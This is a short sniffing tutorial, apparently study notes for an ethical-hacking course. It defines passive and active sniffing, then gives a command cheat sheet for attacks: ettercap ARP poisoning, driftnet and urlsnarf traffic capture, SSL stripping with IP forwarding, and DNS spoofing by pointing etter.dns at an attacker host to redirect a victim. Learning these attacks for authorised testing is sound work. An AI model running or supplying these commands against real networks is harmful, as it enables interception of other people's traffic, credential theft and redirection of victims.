Sniffing:-
--------------
Sniffing is the process of scanning & monitoring of the captured data packets passing through a network using Sniffers. The process of sniffing is performed by using Promiscuous Ports. 

Types Of Sniffing-
--------------------------
	1. Active Sniffing
	2. Passive Sniffing

The Attackers can capture packets like Syslog traffic, DNS traffic, Web traffic, Email & other types of data traffic flowing across the network.
By capturing these packets, an attacker can reveal information such as data, username & passwords from the protocols such as HTTP, POP3, IMAP, SMTP, NMTP, FTP, Telnet & Rlogin and other information.


Passive Sniffing:-
-------------------------
Passive Sniffing is the sniffing type in which there is no need of sending additional packets or interfering the device such as Hub to recieve packets. 

Active Sniffing:-
------------------------
Active Sniffing is the sniffing type in which attacker has to send additional packets to the connected device such as Switch to start recieving packets. 
Attackers uses certain techniques such as MAC Flooding, DHCP Attacks, DNS Poisoning, Switch Port Stealing, ARP Poisoning & Spoofing to monitor traffic passing through the switch.

Content Sniffing-
ettercap -Tqi wlan0 -M arp:remote ///
driftnet -i wlan0

Save Content-
driftnet -i wlan0 -d  /root/newfoldername

URL Sniffing-
ettercap -G
urlsnarf -i wlan0

SSL Striping-
sysctl -w net.ipv4.ip_forward=1 
ettercap -G
tcpdump -i eth0 -n port 80 and host targetIP

DNS Spoofing-
leafpad /etc/ettercap/etter.conf ------- on Linux Services
service apache2 start
ifconfig
leafpad /etc/ettercap/etter.dns -------- Change domain name and set attacker host ip
ettercap -G
target1 is a victim host and target2 is a default gateway
go plugin and enable the dns.spoofing
